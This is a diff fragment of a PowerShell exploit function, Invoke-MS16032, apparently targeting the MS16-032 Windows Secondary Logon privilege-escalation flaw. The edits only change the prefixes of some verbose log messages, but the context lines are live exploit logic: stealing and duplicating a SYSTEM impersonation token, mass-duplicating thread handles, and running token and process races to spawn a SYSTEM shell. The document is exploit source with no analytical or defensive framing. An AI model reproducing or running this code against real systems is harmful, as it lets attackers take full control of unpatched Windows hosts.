@@ -232,7 +232,7 @@ function Invoke-MS16032 {
             Return
         } Write-Verbose "[+] Thread suspended"
         
-        Write-Verbose "[>] Wiping current impersonation token"
+        Write-Verbose "[*] Wiping current impersonation token"
         $CallResult = [Advapi32]::SetThreadToken([ref]$Thread, [IntPtr]::Zero)
         if (!$CallResult) {
             Write-Verbose "[!] SetThreadToken failed, moving on.."
@@ -241,7 +241,7 @@ function Invoke-MS16032 {
             Return
         }
         
-        Write-Verbose "[>] Building SYSTEM impersonation token"
+        Write-Verbose "[*] Building SYSTEM impersonation token"
         $SQOS = New-Object SQOS
         $SQOS.ImpersonationLevel = 2
         $SQOS.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SQOS)
@@ -287,7 +287,7 @@ function Invoke-MS16032 {
     $ThreadArray = @()
     $TidArray = @()
     
-    Write-Verbose "[>] Duplicating CreateProcessWithLogonW handles.."
+    Write-Verbose "[*] Duplicating CreateProcessWithLogonW handles.."
     for ($i=0; $i -lt 500; $i++) {
         $hThread = Get-ThreadHandle
         $hThreadID = [Kernel32]::GetThreadId($hThread)
@@ -313,11 +313,11 @@ function Invoke-MS16032 {
         Get-SystemToken
         
         Write-Verbose "`n[*] Sniffing out SYSTEM shell.."
-        Write-Verbose "`n[>] Duplicating SYSTEM token"
+        Write-Verbose "`n[*] Duplicating SYSTEM token"
         $hDuplicateTokenHandle = [IntPtr]::Zero
         $CallResult = [Advapi32]::DuplicateToken($SysTokenHandle, 2, [ref]$hDuplicateTokenHandle)
         
-        Write-Verbose "[>] Starting token race"
+        Write-Verbose "[*] Starting token race"
         $Runspace = [runspacefactory]::CreateRunspace()
         $StartTokenRace = [powershell]::Create()
         $StartTokenRace.runspace = $Runspace
@@ -330,7 +330,7 @@ function Invoke-MS16032 {
         }).AddArgument($Thread).AddArgument($hDuplicateTokenHandle)
         $AscObj = $StartTokenRace.BeginInvoke()
         
-        Write-Verbose "[>] Starting process race"
+        Write-Verbose "[*] Starting process race"
         $SafeGuard = [diagnostics.stopwatch]::StartNew()
         while ($SafeGuard.ElapsedMilliseconds -lt 10000) {
             $StartupInfo = New-Object STARTUPINFO
